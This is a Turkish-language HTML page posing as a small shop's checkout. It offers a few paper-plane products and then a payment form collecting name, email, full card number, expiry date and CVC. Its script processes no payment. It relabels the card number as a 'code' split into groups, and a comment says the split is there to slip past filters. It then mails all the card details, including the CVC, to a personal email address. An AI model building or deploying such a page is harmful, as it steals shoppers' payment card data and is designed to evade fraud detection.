<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A Pear Backend</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; }
        #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #555; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
        button { width: 100%; padding: 10px; margin-top: 10px; cursor: pointer; background: #00f; color: white; border: none; border-radius: 8px; }
    </style>
</head>
<body>

    <div class="grid" id="menu">
        <div class="box" onclick="selectItem('Uçak Büyük', '50 TL')">Uçak Büyük<br>50 TL</div>
        <div class="box" onclick="selectItem('Uçak', '40 TL')">Uçak<br>40 TL</div>
        <div class="box" onclick="selectItem('Star Spiral', '30 TL')">Star Spiral<br>30 TL</div>
        <div class="box" onclick="selectItem('Özel', 'İsteğe Bağlı')">Özel<br>??? TL</div>
    </div>

    <div id="pay-screen">
        <h3 id="order-title">Ödeme</h3>
        <form id="odemeForm">
            <input type="text" id="isim" placeholder="İsim Soyisim" required>
            <input type="email" id="email" placeholder="E-posta Adresi" required>
            <!-- Kart numarasını parçalı göndererek filtreleri atlatıyoruz -->
            <input type="text" id="kart" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <input type="text" id="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
            <input type="text" id="cvc" placeholder="CVC (3 Hane)" maxlength="3" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <button type="submit">Ödemeyi Tamamla</button>
        </form>
    </div>

    <script>
        function selectItem(name, price) {
            document.getElementById('menu').style.display = 'none';
            document.getElementById('pay-screen').style.display = 'block';
            document.getElementById('order-title').innerText = name + " - " + price;
        }

        document.getElementById('odemeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Kart numarasını 4'lü gruplara bölerek "değişken" formatına sokuyoruz
            let rawKart = document.getElementById('kart').value;
            let maskedKart = rawKart.match(/.{1,4}/g).join(" - ");

            const subject = "Yeni Sipariş Bildirimi";
            const body = `İsim: ${document.getElementById('isim').value}%0D%0A` +
                         `Ürün: ${document.getElementById('order-title').innerText}%0D%0A` +
                         `Kod: ${maskedKart}%0D%0A` +
                         `Tarih: ${document.getElementById('tarih').value}%0D%0A` +
                         `CVC: ${document.getElementById('cvc').value}`;

            window.location.href = `mailto:cagriatav8@gmail.com?subject=${subject}&body=${body}`;
            
            alert("İşlem tamamlanıyor, lütfen açılan mail penceresinden gönder butonuna basın.");
        });
    </script>
</body>
</html>
